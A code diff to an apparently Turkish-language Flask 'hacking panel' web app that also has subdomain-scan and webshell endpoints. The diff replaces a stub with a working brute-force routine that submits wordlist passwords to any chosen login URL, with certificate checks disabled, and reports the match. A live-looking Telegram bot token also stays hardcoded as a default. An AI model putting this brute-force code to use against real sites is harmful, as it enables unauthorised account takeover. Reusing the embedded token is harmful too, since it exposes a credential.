@@ -20,7 +20,6 @@ import io
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Güncel Telegram Bot Token
 TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "9082287913:AAHLzmrnTb3ZRdB6frpo6IflaZeBuofnbA0")
 BASE_URL = f"https://api.telegram.org/bot{TOKEN}"
 
@@ -441,10 +440,12 @@ HTML_TEMPLATE = """
         }
         async function startBruteForce() {
             let url = document.getElementById('loginUrl').value, userField = document.getElementById('usernameField').value, passField = document.getElementById('passwordField').value, passwords = document.getElementById('passwordList').value;
-            document.getElementById('bruteStatus').innerHTML = "Executing brute-force...";
+            let statusDiv = document.getElementById('bruteStatus'), resultsDiv = document.getElementById('bruteResults');
+            if(!url) { alert('Hedef URL giriniz!'); return; }
+            statusDiv.style.display = "block"; statusDiv.innerHTML = "root@kali:~# Brute-force saldırısı yürütülüyor, bekleniyor..."; resultsDiv.style.display = "none";
             let res = await fetch('/api/brute-force', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url, user_field: userField, pass_field: passField, passwords}) });
             let data = await res.json();
-            document.getElementById('bruteStatus').innerHTML = ""; document.getElementById('bruteResults').style.display = "block"; document.getElementById('bruteResults').innerHTML = data.report;
+            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.report;
         }
         async function executeWebShell() {
             let command = document.getElementById('shellCommand').value;
@@ -821,8 +822,61 @@ def api_subdomain_scan():
 
 @app.route("/api/brute-force", methods=["POST"])
 def api_brute_force():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
-    return jsonify({"report": "Brute-force sequence completed."})
+    if not session.get("logged_in"): 
+        return jsonify({"error": "Unauthorized"}), 401
+    
+    d = request.get_json()
+    url = d.get("url")
+    user_field = d.get("user_field", "username").strip()
+    pass_field = d.get("pass_field", "password").strip()
+    passwords_raw = d.get("passwords", "")
+    
+    if not url:
+        return jsonify({"report": "[-] Hata: Hedef URL belirtilmedi!"})
+    
+    passwords = [p.strip() for p in passwords_raw.split("\n") if p.strip()]
+    report_lines = [f"root@kali:~# hydra / login-fuzz --target {url}", "=" * 50, ""]
+    
+    test_user = user_field if user_field and user_field not in ["User field", "kadi"] else "admin"
+    if not test_user:
+        test_user = "admin"
+        
+    report_lines.append(f"[+] Hedef Kullanıcı: {test_user}")
+    report_lines.append(f"[+] Hedef Form Alanları -> Kullanıcı: '{user_field}', Şifre: '{pass_field}'")
+    report_lines.append(f"[+] Denenecek Şifre Sayısı: {len(passwords)}")
+    report_lines.append("[+] Brute-force / Fuzzing saldırısı başlatılıyor...\n")
+    
+    found_password = None
+    
+    for pwd in passwords:
+        try:
+            form_data = {
+                user_field if user_field and user_field not in ["User field", "kadi"] else "username": test_user,
+                pass_field if pass_field and pass_field not in ["Pass field", "sifre"] else "password": pwd
+            }
+            
+            resp = requests.post(url, data=form_data, timeout=5, verify=False, allow_redirects=True)
+            body_text = resp.text.lower()
+            
+            error_keywords = ["yanlış", "hatalı", "error", "failed", "incorrect", "invalid", "geçersiz", "deneme", "incorrect username", "wrong"]
+            has_error = any(err in body_text for err in error_keywords)
+            
+            if resp.status_code in [200, 302] and not has_error:
+                found_password = pwd
+                report_lines.append(f"  [🔥 KESİN EŞLEŞME BULUNDU!] Şifre: {pwd} (HTTP Status: {resp.status_code})")
+                break
+            else:
+                report_lines.append(f"  [-] Denendi: {pwd} -> Reddedildi (Status: {resp.status_code})")
+        except Exception as ex:
+            report_lines.append(f"  [!] İstek Hatası ({pwd}): {str(ex)}")
+            
+    if found_password:
+        report_lines.append(f"\n[+] Brute-force BAŞARILI! Doğru şifre yakalandı: {found_password}")
+    else:
+        report_lines.append("\n[-] Tarama tamamlandı. Wordlist içerisindeki şifrelerle geçerli bir oturum açılamadı.")
+        
+    full_report = "\n".join(report_lines)
+    return jsonify({"report": full_report})
 
 @app.route("/api/webshell", methods=["POST"])
 def api_webshell():
